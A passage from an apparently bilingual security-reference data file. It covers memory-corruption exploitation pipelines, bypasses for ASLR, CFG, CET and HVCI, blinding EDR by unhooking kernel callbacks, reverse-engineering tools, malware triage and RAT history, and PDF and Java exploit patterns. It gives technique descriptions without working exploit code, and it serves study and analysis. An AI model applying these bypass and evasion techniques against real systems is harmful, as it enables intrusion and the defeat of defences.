  <li><strong>Defeat ASLR.</strong> Info leak primitive → leak a libc/binary address → compute base.</li>
  <li><strong>Defeat DEP/NX.</strong> ROP chain. <code>ROPgadget</code>, <code>ropper</code>, <code>one_gadget</code> for single-call magic gadgets.</li>
  <li><strong>Defeat stack canary.</strong> Often shares low byte (zero on Linux); leak via partial overwrite, or brute one byte at a time if fork-server.</li>
  <li><strong>Defeat CFG (Windows) / CET (Intel).</strong>
    <ul>
      <li>CFG checks indirect calls against valid-target bitmap. Bypass: find valid target that lets you continue control flow attacker-favorably, or attack the bitmap itself.</li>
      <li>CET (shadow stack) detects ROP via return-mismatch. Bypass: JOP via indirect jumps not protected by shadow stack, or attack systems that don't enforce shadow stack.</li>
    </ul>
  </li>
  <li><strong>Execute payload.</strong> Spawn shell (Linux), Reverse TCP (Windows). Or open registry / token / process for privilege.</li>
</ol>

<h2>Windows internals — offensive relevance</h2>
<ul>
  <li><strong>Object Manager.</strong> Named kernel objects live in namespace (<code>\\BaseNamedObjects</code>, <code>\\Sessions\\N</code>). Symbolic link abuse: create symlink in user-controllable namespace pointing to privileged target, then privileged process resolves through it.</li>
  <li><strong>Token mechanics.</strong> <code>SeImpersonatePrivilege</code> + service that connects to attacker-controlled named pipe → impersonate SYSTEM-context client. PrintSpoofer, RemotePotato chain on this.</li>
  <li><strong>Kernel callbacks.</strong> EDR drivers register callbacks via <code>PsSetCreateProcessNotifyRoutineEx</code>, <code>ObRegisterCallbacks</code>. From kernel exploit primitive (e.g., signed-driver-load) the callback list can be unhooked to blind EDR.</li>
  <li><strong>HVCI / VBS.</strong> Hypervisor-Enforced Code Integrity blocks unsigned kernel code execution. Bypass requires vulnerable signed driver that performs attacker-controlled read/write — BYOVD pattern.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>The exploit-development bottleneck has shifted upward: the bug is the easy part on modern hardened targets; chaining primitives past CFI/CET/HVCI is the long pole. Budget your time accordingly — 20% finding the bug, 80% turning it into something reliable.</div>
`,
      `
<h2>Korruptions-Klassen</h2>
<ul>
  <li><strong>Stack-Buffer-Overflow.</strong> Klassisches <code>strcpy</code> auf Stack-Array. Verteidigungen: Stack-Canary, ASLR, NX. Noch ausnutzbar mit Info-Leak + ROP.</li>
  <li><strong>Heap-Buffer-Overflow.</strong> Overflow in benachbarte Chunk-Metadata oder in benachbartes Object-Pointer/VTable. Moderne gehärtete Allocators (mimalloc, scudo, jemalloc mit Shadow-Chunks) heben die Latte.</li>
  <li><strong>Use-After-Free.</strong> Freen, dann dereferenzieren. Kontrollierte Daten in den freigegebenen Slot reklamieren, Fake-VTable, Control-Flow auf nächstem virtual Call hijacken. Mitigiert durch MarkUs / GC-style Allocators in Browsers.</li>
  <li><strong>Type-Confusion.</strong> Objekt als anderer Typ behandelt als sein tatsächliches Layout. Häufig in JIT-Engines; Primitive für Arbitrary R/W via Fake-Array-Length.</li>
  <li><strong>Double-Free.</strong> Gleichen Chunk zweimal freen; tcache- oder Fastbin-Poisoning gibt Arbitrary Write. glibc 2.27+ hat tcache-Double-Free-Check.</li>
  <li><strong>Integer-Overflow.</strong> <code>malloc(n * sizeof(x))</code> wo <code>n * sizeof(x)</code> overflowt; kleine Allokation, große Copy.</li>
  <li><strong>Format-String.</strong> <code>printf(user_input)</code> ohne Format. <code>%n</code> schreibt; <code>%s</code> liest. Selten in modernem Code dank Compiler-Warnings.</li>
</ul>

<h2>Fuzzing — Discovery zu Triage</h2>
<ul>
  <li><strong>AFL++ für Grey-Box.</strong> Target mit afl-cc kompilieren; Corpus-Seed → Coverage-getriebene Mutation. ASAN-instrumentierten Build für saubereres Crash-Signal hinzufügen.</li>
  <li><strong>libFuzzer für In-Process.</strong> Per-Function-Harness; schneller pro Iteration als AFL. Beste für Library-APIs.</li>
  <li><strong>Honggfuzz für Kernel / Hardware-Assisted.</strong> Hardware-Perf-Counter-Coverage. Gut wenn Source-Level-Instrumentation nicht verfügbar.</li>
  <li><strong>Crash-Triage.</strong>
    <ul>
      <li>ASAN-Report → Klassifikation (heap-buffer-overflow, use-after-free etc.).</li>
      <li>Input minimieren — afl-tmin / libFuzzer's <code>-minimize_crash=1</code>.</li>
      <li>Reproduzieren unter gdb / rr / Time-Travel-Debugger. <code>rr</code> besonders wertvoll: einmal aufzeichnen, vor und zurück gehen, um Root-Cause zu finden.</li>
      <li>Kategorisieren: Control-Flow-Hijackable, Info-Leak, DoS-only. Nur die ersten zwei sind primäre Exploitation-Ziele.</li>
    </ul>
  </li>
</ul>

<h2>Exploitation-Pipeline — Crash zu funktionierender RCE</h2>
<ol>
  <li><strong>Primitive etablieren.</strong> Arbitrary Read, Arbitrary Write, PC-Control, Stack-Pivot-Control, Function-Pointer-Control.</li>
  <li><strong>ASLR schlagen.</strong> Info-Leak-Primitive → libc-/Binary-Adresse leaken → Base berechnen.</li>
  <li><strong>DEP/NX schlagen.</strong> ROP-Chain. <code>ROPgadget</code>, <code>ropper</code>, <code>one_gadget</code> für Single-Call-Magic-Gadgets.</li>
  <li><strong>Stack-Canary schlagen.</strong> Teilt oft Low-Byte (Null auf Linux); via Partial-Overwrite leaken oder Byte für Byte bruten wenn Fork-Server.</li>
  <li><strong>CFG (Windows) / CET (Intel) schlagen.</strong>
    <ul>
      <li>CFG prüft Indirect-Calls gegen Valid-Target-Bitmap. Bypass: Valid-Target finden, das Control-Flow angreifer-günstig fortsetzt, oder Bitmap selbst angreifen.</li>
      <li>CET (Shadow-Stack) detektiert ROP via Return-Mismatch. Bypass: JOP via Indirect-Jumps nicht von Shadow-Stack geschützt, oder Systeme angreifen, die Shadow-Stack nicht enforcen.</li>
    </ul>
  </li>
  <li><strong>Payload ausführen.</strong> Shell spawnen (Linux), Reverse-TCP (Windows). Oder Registry / Token / Process für Privileg öffnen.</li>
</ol>

<h2>Windows-Internals — offensive Relevanz</h2>
<ul>
  <li><strong>Object-Manager.</strong> Named Kernel-Objects leben im Namespace (<code>\\BaseNamedObjects</code>, <code>\\Sessions\\N</code>). Symbolic-Link-Missbrauch: Symlink im user-kontrollierbaren Namespace auf privilegiertes Target, dann resolvt privilegierter Prozess durch.</li>
  <li><strong>Token-Mechanik.</strong> <code>SeImpersonatePrivilege</code> + Service, der zu angreifer-kontrolliertem Named-Pipe connectet → SYSTEM-Context-Client impersonieren. PrintSpoofer, RemotePotato-Kette darauf.</li>
  <li><strong>Kernel-Callbacks.</strong> EDR-Treiber registrieren Callbacks via <code>PsSetCreateProcessNotifyRoutineEx</code>, <code>ObRegisterCallbacks</code>. Aus Kernel-Exploit-Primitiv (z.B. Signed-Driver-Load) kann die Callback-Liste unhookt werden, um EDR zu blenden.</li>
  <li><strong>HVCI / VBS.</strong> Hypervisor-Enforced-Code-Integrity blockt unsigned Kernel-Code-Execution. Bypass erfordert vulnerable signed Treiber, der angreifer-kontrolliertes R/W ausführt — BYOVD-Muster.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Der Exploit-Development-Bottleneck hat sich nach oben verschoben: der Bug ist auf modernen gehärteten Targets der leichte Teil; Primitive an CFI/CET/HVCI vorbei zu verketten ist das lange Brett. Zeit entsprechend budgetieren — 20% Bug finden, 80% zuverlässig machen.</div>
`
    ),
    phases: []
  },
  {
    id: "reverse-engineering-fundamentals",
    domain: "reverse-malware", tier: 3,
    title: T("Reverse Engineering Fundamentals", "Reverse Engineering — Grundlagen"),
    blurb: T(
      "Quick-reference for disassemblers, debuggers, and the signatures to look for first — including an ARM reference for analysts moving from x86 and the modern browser as an attack surface.",
      "Quick-Reference für Disassembler, Debugger und die zuerst zu prüfenden Signaturen — inklusive ARM-Referenz für Analysten beim Übergang von x86 und der moderne Browser als Angriffsfläche."
    ),
    body: B(
      `
<h2>Tool selection</h2>
<ul>
  <li><strong>Ghidra.</strong> Free, decompiler-first workflow, scriptable in Python/Java. Best default for malware analysis and CTF.</li>
  <li><strong>IDA Pro.</strong> Commercial, gold standard for large binaries, best graph view, FLIRT signatures for library identification. Hex-Rays decompiler still tops Ghidra's on complex code.</li>
  <li><strong>Binary Ninja.</strong> Affordable, ILs (LLIL/MLIL/HLIL) are excellent for analysis automation. Headless API for batch processing.</li>
  <li><strong>radare2 / rizin.</strong> Free, scriptable, CLI-first. Steep learning curve. Use when you need to script per-instruction analysis over thousands of binaries.</li>
  <li><strong>x64dbg.</strong> Free Windows debugger. Default for unpacking malware on Windows.</li>
  <li><strong>WinDbg.</strong> Microsoft's debugger. Required for kernel debugging, dump analysis. Modern WinDbg has reasonable UI now.</li>
  <li><strong>gdb + GEF or pwndbg.</strong> Linux debugger with security-focused extensions. Standard for binary CTFs.</li>
  <li><strong>rr.</strong> Time-travel debugger for Linux. Record once, run forwards and backwards. Game-changer for hard bugs.</li>
</ul>

<h2>First-look triage of an unknown binary</h2>
<ol>
  <li><strong>File type.</strong> <code>file unknown.bin</code> → format + arch.</li>
  <li><strong>Section anomalies.</strong> Ghidra/IDA section listing. .text very small + huge .data section = packer. Section name mismatch (e.g., UPX0/UPX1) = packed.</li>
  <li><strong>Imports.</strong> <code>nm -D</code> / <code>dumpbin /imports</code>. CryptDecrypt + VirtualAlloc + WriteProcessMemory = unpacker stub. Curl + json + base64 = exfil. Minimal imports + LoadLibrary/GetProcAddress = dynamic resolution to hide intent.</li>
  <li><strong>Strings.</strong> <code>strings -n 7</code> for ASCII; <code>strings -el</code> for UTF-16. URLs, file paths, error messages, version strings.</li>
  <li><strong>Entropy.</strong> <code>binwalk -E</code>. Sections at &gt;7.0 entropy = encrypted/compressed. Packed binary will show a low-entropy stub at the entry point then a high-entropy region it unpacks.</li>
  <li><strong>Packer signatures.</strong> Detect-It-Easy / PEiD. UPX → <code>upx -d</code> unpacks itself. Themida/VMProtect = expect manual unpacking weeks.</li>
  <li><strong>Anti-debug telltales.</strong> <code>IsDebuggerPresent</code>, <code>CheckRemoteDebuggerPresent</code>, PEB BeingDebugged read, INT 3 scan over own code, timing checks (RDTSC delta).</li>
</ol>

<h2>ARM for x86 analysts</h2>
<ul>
  <li><strong>Registers.</strong> ARM64: x0–x30 (x30=LR), SP, PC. ARM32: r0–r12, r13=SP, r14=LR, r15=PC. Calling convention: x0–x7 args (ARM64), r0–r3 (ARM32). Return in x0/r0.</li>
  <li><strong>Endianness.</strong> ARM default little-endian; some embedded big-endian. Confirm with header.</li>
  <li><strong>Common patterns.</strong>
    <ul>
      <li><code>stp x29, x30, [sp, #-16]!</code> — function prologue (save FP + LR).</li>
      <li><code>ldp x29, x30, [sp], #16</code> — epilogue.</li>
      <li><code>bl func</code> — call (branch-and-link, sets LR).</li>
      <li><code>ret</code> — return (branch to LR).</li>
    </ul>
  </li>
  <li><strong>Syscalls.</strong> Linux ARM64: syscall number in x8, args in x0–x5, <code>svc #0</code>. macOS ARM64 uses different syscall conventions; consult <code>/usr/share/man/man2</code>.</li>
  <li><strong>PAC (Pointer Authentication).</strong> ARMv8.3+. Return addresses signed before push, verified before use. Bypass: signing gadget (rare), forge via leak of signing key (impossible without kernel), pivot away from signed returns to BR/BLR-style indirect (BTI may also be enabled).</li>
</ul>

<h2>Browser as attack surface</h2>
<ul>
  <li><strong>Process model.</strong> Chrome: one browser process + N renderer processes (sandboxed) + GPU + network process. V8 engine in renderer. Firefox similar with content processes. Safari multi-process with WebKit.</li>
  <li><strong>Sandbox boundary.</strong> Renderer can't open files, network sockets directly; talks to broker via IPC (Mojo in Chrome). Bypass = sandbox escape via IPC vuln or via a browser-process-side bug.</li>
  <li><strong>JIT engines.</strong> V8 TurboFan, JavaScriptCore FTL, SpiderMonkey IonMonkey. Common vuln class: type confusion via incorrect optimization assumption. JIT-spray for code-cache write/exec primitive.</li>
  <li><strong>Mitigations.</strong> Site isolation (Chrome) — separate process per origin to defeat Spectre-class leaks. CFI for indirect calls. JIT-isolation (renderer can't read/write JIT pages).</li>
  <li><strong>Historic CVE clusters.</strong> V8 TurboFan bounds-check elimination (CVE-2018-17463, CVE-2020-6418). WebKit JS bounds-check (CVE-2021-30858). Use-after-free in DOM event-handler tear-down.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>For malware analysis, run the binary in a snapshot VM with Wireshark + Sysmon first, then reverse what you saw. Pure-static analysis on packed/obfuscated samples takes 10x longer than dynamic-then-static. For exploit analysis, the reverse — dynamic only after you understand the static structure.</div>
`,
      `
<h2>Tool-Auswahl</h2>
<ul>
  <li><strong>Ghidra.</strong> Frei, Decompiler-first-Workflow, scriptbar in Python/Java. Bester Default für Malware-Analyse und CTF.</li>
  <li><strong>IDA Pro.</strong> Kommerziell, Gold-Standard für große Binaries, beste Graph-View, FLIRT-Signatures für Library-Identifikation. Hex-Rays-Decompiler übertrifft Ghidras auf komplexem Code.</li>
  <li><strong>Binary Ninja.</strong> Erschwinglich, ILs (LLIL/MLIL/HLIL) exzellent für Analyse-Automation. Headless-API für Batch-Processing.</li>
  <li><strong>radare2 / rizin.</strong> Frei, scriptbar, CLI-first. Steile Lernkurve. Nutzen wenn Per-Instruction-Analyse über Tausende von Binaries gescripted werden muss.</li>
  <li><strong>x64dbg.</strong> Freier Windows-Debugger. Default zum Unpacken von Malware auf Windows.</li>
  <li><strong>WinDbg.</strong> Microsofts Debugger. Pflicht für Kernel-Debugging, Dump-Analyse. Modernes WinDbg hat jetzt vernünftige UI.</li>
  <li><strong>gdb + GEF oder pwndbg.</strong> Linux-Debugger mit Security-fokussierten Extensions. Standard für Binär-CTFs.</li>
  <li><strong>rr.</strong> Time-Travel-Debugger für Linux. Einmal aufzeichnen, vorwärts und rückwärts laufen. Game-Changer für harte Bugs.</li>
</ul>

<h2>Erster Blick auf unbekanntes Binary</h2>
<ol>
  <li><strong>File-Type.</strong> <code>file unknown.bin</code> → Format + Arch.</li>
  <li><strong>Section-Anomalien.</strong> Ghidra-/IDA-Section-Listing. .text sehr klein + riesige .data-Section = Packer. Section-Name-Mismatch (z.B. UPX0/UPX1) = packed.</li>
  <li><strong>Imports.</strong> <code>nm -D</code> / <code>dumpbin /imports</code>. CryptDecrypt + VirtualAlloc + WriteProcessMemory = Unpacker-Stub. Curl + json + base64 = Exfil. Minimale Imports + LoadLibrary/GetProcAddress = dynamische Resolution zur Intent-Versteckung.</li>
  <li><strong>Strings.</strong> <code>strings -n 7</code> für ASCII; <code>strings -el</code> für UTF-16. URLs, File-Pfade, Error-Messages, Version-Strings.</li>
  <li><strong>Entropy.</strong> <code>binwalk -E</code>. Sections bei &gt;7.0 Entropy = encrypted/compressed. Packed Binary zeigt Low-Entropy-Stub am Entry-Point, dann High-Entropy-Region, die es entpackt.</li>
  <li><strong>Packer-Signatures.</strong> Detect-It-Easy / PEiD. UPX → <code>upx -d</code> entpackt selbst. Themida/VMProtect = Wochen manuelles Unpacking erwarten.</li>
  <li><strong>Anti-Debug-Tells.</strong> <code>IsDebuggerPresent</code>, <code>CheckRemoteDebuggerPresent</code>, PEB-BeingDebugged-Read, INT-3-Scan über eigenen Code, Timing-Checks (RDTSC-Delta).</li>
</ol>

<h2>ARM für x86-Analysten</h2>
<ul>
  <li><strong>Register.</strong> ARM64: x0–x30 (x30=LR), SP, PC. ARM32: r0–r12, r13=SP, r14=LR, r15=PC. Calling-Convention: x0–x7 Args (ARM64), r0–r3 (ARM32). Return in x0/r0.</li>
  <li><strong>Endianness.</strong> ARM default Little-Endian; manche Embedded Big-Endian. Mit Header bestätigen.</li>
  <li><strong>Häufige Muster.</strong>
    <ul>
      <li><code>stp x29, x30, [sp, #-16]!</code> — Function-Prolog (FP + LR speichern).</li>
      <li><code>ldp x29, x30, [sp], #16</code> — Epilog.</li>
      <li><code>bl func</code> — Call (Branch-and-Link, setzt LR).</li>
      <li><code>ret</code> — Return (Branch zu LR).</li>
    </ul>
  </li>
  <li><strong>Syscalls.</strong> Linux ARM64: Syscall-Nummer in x8, Args in x0–x5, <code>svc #0</code>. macOS ARM64 nutzt andere Syscall-Konventionen; <code>/usr/share/man/man2</code> konsultieren.</li>
  <li><strong>PAC (Pointer Authentication).</strong> ARMv8.3+. Return-Adressen signiert vor Push, verifiziert vor Use. Bypass: Signing-Gadget (selten), via Signing-Key-Leak forgen (unmöglich ohne Kernel), weg von signierten Returns zu BR/BLR-style Indirect pivoten (BTI möglicherweise auch enabled).</li>
</ul>

<h2>Browser als Angriffsfläche</h2>
<ul>
  <li><strong>Process-Modell.</strong> Chrome: ein Browser-Prozess + N Renderer-Prozesse (sandboxed) + GPU + Network-Prozess. V8-Engine im Renderer. Firefox ähnlich mit Content-Prozessen. Safari Multi-Process mit WebKit.</li>
  <li><strong>Sandbox-Grenze.</strong> Renderer kann nicht direkt Files öffnen, Network-Sockets; spricht mit Broker via IPC (Mojo in Chrome). Bypass = Sandbox-Escape via IPC-Vuln oder via Browser-Process-seitigen Bug.</li>
  <li><strong>JIT-Engines.</strong> V8 TurboFan, JavaScriptCore FTL, SpiderMonkey IonMonkey. Häufige Vuln-Klasse: Type-Confusion via inkorrekter Optimierungs-Annahme. JIT-Spray für Code-Cache-Write/Exec-Primitive.</li>
  <li><strong>Mitigations.</strong> Site-Isolation (Chrome) — separater Prozess pro Origin, um Spectre-Klassen-Leaks zu schlagen. CFI für Indirect-Calls. JIT-Isolation (Renderer kann nicht in JIT-Pages lesen/schreiben).</li>
  <li><strong>Historische CVE-Cluster.</strong> V8-TurboFan-Bounds-Check-Elimination (CVE-2018-17463, CVE-2020-6418). WebKit-JS-Bounds-Check (CVE-2021-30858). Use-After-Free in DOM-Event-Handler-Tear-Down.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Für Malware-Analyse Binary zuerst in Snapshot-VM mit Wireshark + Sysmon laufen lassen, dann reverten was du gesehen hast. Pure-Static-Analyse auf packed/obfuscated Samples dauert 10× länger als Dynamic-then-Static. Für Exploit-Analyse umgekehrt — dynamisch erst, wenn statische Struktur verstanden ist.</div>
`
    ),
    phases: []
  },
  {
    id: "malware-analysis-canon",
    domain: "reverse-malware", tier: 3,
    title: T("Malware Analysis — Canonical Reference", "Malware-Analyse — kanonische Referenz"),
    blurb: T(
      "Triage workflow, packer recognition, behavioral exploit profile, RAT family-behavior reference, and the template for documenting a sustained adversary group.",
      "Triage-Workflow, Packer-Erkennung, behaviorales Exploit-Profil, RAT-Familien-Verhaltens-Referenz und das Template zur Dokumentation einer nachhaltigen Adversary-Gruppe."
    ),
    body: B(
      `
<h2>Triage pipeline</h2>
<ol>
  <li><strong>Hash &amp; reputation.</strong> SHA-256 against VirusTotal, MalwareBazaar, Hybrid Analysis. Known sample = use existing analysis as starting point.</li>
  <li><strong>Static features.</strong> File type, sections, imports, strings, certs, resources, overlay. Extract with <code>pestudio</code>, <code>capa</code>, <code>floss</code>.</li>
  <li><strong>capa rules.</strong> Maps code patterns to MITRE ATT&amp;CK techniques. Quick capability inventory without execution.</li>
  <li><strong>Sandbox detonation.</strong> Cuckoo / Cape / Hatching Triage. Captures network, filesystem, registry, process tree.</li>
  <li><strong>Manual gate.</strong> Auto-analysis confidence low (heavy obfuscation, anti-VM, custom packer) → escalate to manual reverse-engineering.</li>
</ol>

<h2>Packer recognition + unpacking</h2>
<ul>
  <li><strong>UPX.</strong> Section names <code>UPX0</code>, <code>UPX1</code>. <code>upx -d</code> unpacks. Most common, easiest.</li>
  <li><strong>Themida / VMProtect.</strong> Detected by Detect-It-Easy. Virtualization-based: rewrites code into custom bytecode interpreted at runtime. Weeks of manual work.</li>
  <li><strong>ASPack, PECompact, MPRESS.</strong> Older commercial packers. Generic unpacker (<code>UnpacMe</code>, <code>de4dot</code> for .NET) often handles.</li>
  <li><strong>Custom packer.</strong> No vendor signature; entry-point stub allocates RWX, decrypts, JMP into decrypted code. Set hardware breakpoint on the OEP candidate after the long decryption loop.</li>
  <li><strong>Generic unpacking flow.</strong> Trace until VirtualAlloc + WriteProcessMemory + transfer of control (CALL, JMP) into the new region. That's OEP. Dump from memory, fix IAT with <code>Scylla</code>, reconstruct PE.</li>
</ul>

<h2>Behavioral profile separated from payload</h2>
<ul>
  <li><strong>Exploit-stage behavior.</strong> Process spawned (often unusual: WINWORD spawning powershell), file written to %TEMP%, registry mutation in Run/RunOnce, network beacon to never-before-seen host.</li>
  <li><strong>Payload-stage behavior (varies by family).</strong> Credential dump (LSASS access), keylogger (low-level hook install), persistence (scheduled task created), C2 (DNS or HTTPS beacon).</li>
  <li><strong>Why separate.</strong> One detection on exploit-stage behavior catches the entire population; per-payload detection scales linearly with families.</li>
</ul>

<h2>RAT generations</h2>
<ul>
  <li><strong>Gen 1 (2000s).</strong> PoisonIvy, Sub7, Bifrost. GUI-driven, direct TCP C2, no encryption. Trivially detected today.</li>
  <li><strong>Gen 2 (early 2010s).</strong> Gh0st, DarkComet, njRAT. Custom protocols, basic obfuscation, modular plugins.</li>
  <li><strong>Gen 3 (mid-2010s).</strong> AsyncRAT, NanoCore. HTTPS C2, simple anti-analysis, builder-driven so many derivatives.</li>
  <li><strong>Gen 4 (late 2010s onward).</strong> Cobalt Strike, Sliver, Mythic, Brute Ratel. Operator framework, beacon protocols designed for stealth (jitter, sleep mask, domain fronting), modular post-ex.</li>
  <li><strong>Gen 5 (current).</strong> Custom toolchains by sophisticated actors. Memory-only payloads, EDR-evasion built in (direct syscalls, indirect syscalls, AMSI patches, ETW patches). Often single-use per intrusion.</li>
</ul>

<h2>APT group template — adding a new actor</h2>
<ul>
  <li><strong>Tooling.</strong> Custom malware families, public tooling preferences, exploit kit choices.</li>
  <li><strong>Infrastructure.</strong> Hosting pattern (bulletproof, cloud, compromised), domain-registration habits, certificate patterns.</li>
  <li><strong>Victimology.</strong> Sectors targeted, geographic targeting, victim selection criteria (opportunistic vs strategic).</li>
  <li><strong>Confidence.</strong> Per claim: primary observation / public report / inferred. Distinguish what your team observed from what the broader community has published.</li>
</ul>
<div class="rs-rule"><strong>Rule of thumb</strong>For automated triage to be useful at scale, the workflow must surface "low confidence, escalate" cleanly. A pipeline that outputs binary "benign/malicious" misses the bucket where most analyst value lives — the "interesting, look closer" sample.</div>
`,
      `
<h2>Triage-Pipeline</h2>
<ol>
  <li><strong>Hash &amp; Reputation.</strong> SHA-256 gegen VirusTotal, MalwareBazaar, Hybrid Analysis. Bekanntes Sample = existierende Analyse als Startpunkt nutzen.</li>
  <li><strong>Static-Features.</strong> Filetype, Sections, Imports, Strings, Certs, Resources, Overlay. Extrahieren mit <code>pestudio</code>, <code>capa</code>, <code>floss</code>.</li>
  <li><strong>capa-Regeln.</strong> Mappt Code-Patterns auf MITRE-ATT&amp;CK-Techniques. Schnelle Capability-Inventur ohne Ausführung.</li>
  <li><strong>Sandbox-Detonation.</strong> Cuckoo / Cape / Hatching Triage. Captures Netzwerk, Filesystem, Registry, Process-Tree.</li>
  <li><strong>Manuelles Gate.</strong> Auto-Analyse-Konfidenz niedrig (schwere Obfuskation, Anti-VM, Custom-Packer) → zu manuellem Reverse-Engineering eskalieren.</li>
</ol>

<h2>Packer-Erkennung + Unpacking</h2>
<ul>
  <li><strong>UPX.</strong> Section-Namen <code>UPX0</code>, <code>UPX1</code>. <code>upx -d</code> entpackt. Häufigstes, einfachstes.</li>
  <li><strong>Themida / VMProtect.</strong> Detected by Detect-It-Easy. Virtualisierungs-basiert: schreibt Code in Custom-Bytecode um, der zur Runtime interpretiert wird. Wochen manueller Arbeit.</li>
  <li><strong>ASPack, PECompact, MPRESS.</strong> Ältere kommerzielle Packer. Generischer Unpacker (<code>UnpacMe</code>, <code>de4dot</code> für .NET) handled oft.</li>
  <li><strong>Custom-Packer.</strong> Keine Vendor-Signatur; Entry-Point-Stub allokiert RWX, entschlüsselt, JMP in entschlüsselten Code. Hardware-Breakpoint auf OEP-Kandidaten nach langer Decryption-Loop setzen.</li>
  <li><strong>Generischer Unpacking-Flow.</strong> Tracen bis VirtualAlloc + WriteProcessMemory + Control-Transfer (CALL, JMP) in die neue Region. Das ist OEP. Aus Memory dumpen, IAT mit <code>Scylla</code> fixen, PE rekonstruieren.</li>
</ul>

<h2>Verhaltensprofil getrennt vom Payload</h2>
<ul>
  <li><strong>Exploit-Stage-Verhalten.</strong> Prozess gespawnt (oft ungewöhnlich: WINWORD spawnt powershell), File in %TEMP% geschrieben, Registry-Mutation in Run/RunOnce, Netzwerk-Beacon zu nie zuvor gesehenem Host.</li>
  <li><strong>Payload-Stage-Verhalten (familienspezifisch).</strong> Credential-Dump (LSASS-Access), Keylogger (Low-Level-Hook-Install), Persistenz (Scheduled-Task erstellt), C2 (DNS- oder HTTPS-Beacon).</li>
  <li><strong>Warum trennen.</strong> Eine Detektion auf Exploit-Stage-Verhalten fängt die gesamte Population; Per-Payload-Detektion skaliert linear mit Familien.</li>
</ul>

<h2>RAT-Generationen</h2>
<ul>
  <li><strong>Gen 1 (2000er).</strong> PoisonIvy, Sub7, Bifrost. GUI-getrieben, direkter TCP-C2, keine Verschlüsselung. Heute trivial detektiert.</li>
  <li><strong>Gen 2 (frühe 2010er).</strong> Gh0st, DarkComet, njRAT. Custom-Protokolle, Basic-Obfuskation, modulare Plugins.</li>
  <li><strong>Gen 3 (Mitte 2010er).</strong> AsyncRAT, NanoCore. HTTPS-C2, einfache Anti-Analyse, Builder-getrieben mit vielen Derivaten.</li>
  <li><strong>Gen 4 (späte 2010er an).</strong> Cobalt Strike, Sliver, Mythic, Brute Ratel. Operator-Framework, Beacon-Protokolle stealth-optimiert (Jitter, Sleep-Mask, Domain-Fronting), modulares Post-Ex.</li>
  <li><strong>Gen 5 (aktuell).</strong> Custom-Toolchains von sophisticated Actors. Memory-only Payloads, EDR-Evasion eingebaut (Direct-Syscalls, Indirect-Syscalls, AMSI-Patches, ETW-Patches). Oft Single-Use pro Intrusion.</li>
</ul>

<h2>APT-Group-Template — neuen Actor hinzufügen</h2>
<ul>
  <li><strong>Tooling.</strong> Custom-Malware-Familien, Public-Tooling-Präferenzen, Exploit-Kit-Wahlen.</li>
  <li><strong>Infrastruktur.</strong> Hosting-Muster (Bulletproof, Cloud, kompromittiert), Domain-Registrations-Gewohnheiten, Certificate-Muster.</li>
  <li><strong>Victimology.</strong> Anvisierte Sektoren, geographisches Targeting, Victim-Auswahlkriterien (opportunistisch vs strategisch).</li>
  <li><strong>Konfidenz.</strong> Pro Claim: primäre Beobachtung / öffentlicher Report / inferred. Was dein Team beobachtet hat von dem trennen, was die breitere Community publiziert hat.</li>
</ul>
<div class="rs-rule"><strong>Faustregel</strong>Damit automatisierte Triage im Scale nützlich ist, muss der Workflow "Low Confidence, eskalieren" sauber aufdecken. Eine Pipeline, die binär "benign/malicious" ausgibt, verpasst den Bucket, in dem der meiste Analyst-Wert lebt — das "interessante, näher anschauen"-Sample.</div>
`
    ),
    phases: []
  },
  {
    id: "document-and-runtime-exploits",
    domain: "reverse-malware", tier: 3,
    title: T("Document & Runtime Exploits", "Dokument- & Runtime-Exploits"),
    blurb: T(
      "PDF as a delivery vehicle (structure, script extraction, parser quirks) and the Java-runtime exploit reference — historical and current patterns, with what each reveals about the deployed JRE.",
      "PDF als Delivery-Vehikel (Struktur, Skript-Extraktion, Parser-Quirks) und die Java-Runtime-Exploit-Referenz — historische und aktuelle Muster mit dem, was jeder über die deployte JRE verrät."
    ),
    body: B(
      `
<h2>PDF — structure</h2>
<ul>
  <li><strong>File layout.</strong> Header (<code>%PDF-1.x</code>), body (numbered objects), xref table, trailer with root object reference. <code>peepdf</code> / <code>pdfid</code> / <code>pdf-parser</code> for structural analysis.</li>
  <li><strong>Object types of interest.</strong>
    <ul>
      <li><code>/JavaScript</code> + <code>/JS</code> — JS payload (the obvious one).</li>
      <li><code>/EmbeddedFile</code> — attached payload (dropper).</li>
      <li><code>/OpenAction</code>, <code>/AA</code> — auto-trigger on open.</li>
      <li><code>/Launch</code> — launch external app (mostly killed by modern viewers).</li>
      <li><code>/RichMedia</code> — embedded Flash (historical; still in old samples).</li>
      <li><code>/SubmitForm</code> — submit form to attacker URL.</li>
    </ul>
  </li>
  <li><strong>Suspicious indicators.</strong> Mismatch between declared object count and actual; massive object count for a "small" PDF; encoded streams (<code>/Filter /FlateDecode /ASCIIHexDecode</code> chained).</li>
</ul>

<h2>PDF — script extraction</h2>
<ol>
  <li><code>pdfid file.pdf</code> shows counts of suspicious keywords.</li>
  <li><code>pdf-parser -f file.pdf</code> lists objects with their filtered content.</li>
  <li>Find object containing <code>/JS</code> or <code>/JavaScript</code> — extract content.</li>
  <li>Decode with <code>js-beautify</code>; then deobfuscate (often <code>app.alert(unescape("%u..."))</code> shellcode).</li>
  <li>Run extracted JS in a sandboxed JS interpreter (<code>spidermonkey</code>) with stubbed PDF-specific APIs to see decoded payload.</li>
</ol>

<h2>PDF — viewer parser disagreements</h2>
<ul>
  <li><strong>Adobe Reader vs Foxit vs browser-native.</strong> Each parses xref-corruption, multiple <code>startxref</code> entries, header in body, slightly differently. Attackers craft files that one viewer rejects (used by sandbox) and another accepts (used by victim).</li>
  <li><strong>Polyglot files.</strong> Valid PDF + valid ZIP + valid JPEG simultaneously. Different consumers see different content.</li>
  <li><strong>Sig bypass via incremental update.</strong> Original PDF signed; attacker appends incremental update changing rendered content; viewer shows updated content with green signature checkmark from original signature.</li>
</ul>

<h2>Java — historical exploit patterns</h2>
<ul>
  <li><strong>Applet sandbox escapes (2012–2014).</strong> CVE-2012-4681 (TrustedMethodChainsToTrue), CVE-2013-2423, CVE-2013-2465. Defined the era; pushed enterprises off browser-side Java.</li>
  <li><strong>JNLP / Web Start.</strong> Java Web Start let unsigned-but-trusted apps run outside sandbox. Multiple bypasses of the trust-prompt.</li>
  <li><strong>Browser plugin EOL.</strong> Modern browsers don't run Java. Pattern is historical for forensics; not current.</li>
</ul>

<h2>Java — current patterns</h2>
<ul>
